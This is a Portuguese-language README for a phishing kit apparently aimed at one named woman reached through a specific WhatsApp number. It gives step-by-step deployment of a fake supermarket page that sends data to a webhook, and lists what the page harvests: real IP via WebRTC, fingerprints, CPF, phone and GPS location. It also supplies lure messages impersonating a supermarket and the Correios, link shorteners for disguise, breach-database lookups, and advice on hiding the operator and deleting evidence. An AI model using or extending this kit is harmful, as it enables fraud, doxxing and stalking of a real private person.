# IR-KALINE - Kit de Phishing & Coleta

## Arquivos

| Arquivo | Descrição |
|---------|-----------|
| `index.html` | Página de phishing (Supermercado Araguaína) |
| `collector.py` | Servidor Python para receber dados |
| `breach_search.py` | Script de pesquisa em breach databases |

---

## DEPLOY RÁPIDO (5 minutos)

### Opção 1: Webhook.site (MAIS FÁCIL)

1. Acesse https://webhook.site
2. Copie sua URL única
3. Edite `index.html` linha 253:
   ```javascript
   const WEBHOOK_URL = 'https://webhook.site/SEU-ID-UNICO';
   ```
4. Hospede o `index.html` em qualquer lugar

### Opção 2: Servidor Próprio (VPS)

```bash
# 1. Subir arquivos para VPS
scp -r phishing/* user@vps:/var/www/kaline/

# 2. Na VPS, iniciar collector
cd /var/www/kaline
python3 collector.py &

# 3. Configurar nginx
server {
    listen 80;
    server_name promo-araguaina.com;
    root /var/www/kaline;
    index index.html;
}

# 4. HTTPS com Let's Encrypt
certbot --nginx -d promo-araguaina.com
```

### Opção 3: Ngrok (Teste Local)

```bash
# Terminal 1: Servidor Python
python3 collector.py

# Terminal 2: Ngrok
ngrok http 8443

# Copiar URL ngrok para WEBHOOK_URL no index.html
```

---

## DADOS COLETADOS

### Automático (sem interação)
- IP via WebRTC (IP REAL, bypass VPN)
- Browser fingerprint (visitorId único)
- User-Agent, plataforma, idioma
- Resolução de tela
- Timezone
- Informações de conexão (4G/WiFi)
- Status da bateria
- Canvas fingerprint
- WebGL fingerprint
- Audio fingerprint

### Com interação do usuário
- Nome completo
- CPF
- Telefone/WhatsApp
- Geolocalização GPS (se permitir)

---

## PRETEXTOS RECOMENDADOS

### Via WhatsApp para 63992237479:

**Pretexto 1 - Promoção:**
```
🛒 Supermercado Araguaína: Parabéns! Você foi selecionada
para ganhar R$50 em compras. Resgate aqui: [LINK]
```

**Pretexto 2 - Gambira:**
```
Oi Kaline! Vi seu anúncio no Gambira, ainda tá disponível?
Achei essa avaliação sobre vendas no grupo: [LINK]
```

**Pretexto 3 - Correios:**
```
📦 Correios: Sua encomenda está aguardando retirada.
Rastreie aqui: [LINK]
```

---

## LINKS ÚTEIS

### Encurtadores (para disfarçar URL)
- https://bit.ly
- https://tinyurl.com
- https://is.gd

### Hospedagem Gratuita
- https://pages.github.com (privado)
- https://netlify.com
- https://vercel.com
- https://render.com

### Domínios Baratos
- https://namecheap.com
- https://porkbun.com

---

## EXECUÇÃO BREACH SEARCH

```bash
# Instalar dependências
pip install requests

# Executar
python3 breach_search.py

# Seguir instruções para pesquisa manual em:
# - databreach.com/sus-brazil-2024
# - snusbase.com
# - leakcheck.io
# - intelx.io
```

---

## SEGURANÇA OPERACIONAL

⚠️ **IMPORTANTE:**

1. **Use VPN/Tor** para hospedar e acessar
2. **VPS anônima** (paga com crypto)
3. **Domínio descartável** (não associado a você)
4. **Email descartável** para webhooks
5. **Delete evidências** após operação

---

## TROUBLESHOOTING

### WebRTC não captura IP
- Alvo pode estar usando Firefox com WebRTC desabilitado
- Tentar técnica alternativa (WhatsApp call)

### Geolocalização não funciona
- Usuário negou permissão
- Browser mobile pede permissão, desktop geralmente bloqueia

### Webhook não recebe dados
- Verificar CORS headers
- Testar com `curl -X POST webhook_url`
- Usar mode: 'no-cors' no fetch

---

**NEURAL OFFSEC TEAM - IR-KALINE**
**USO AUTORIZADO APENAS**
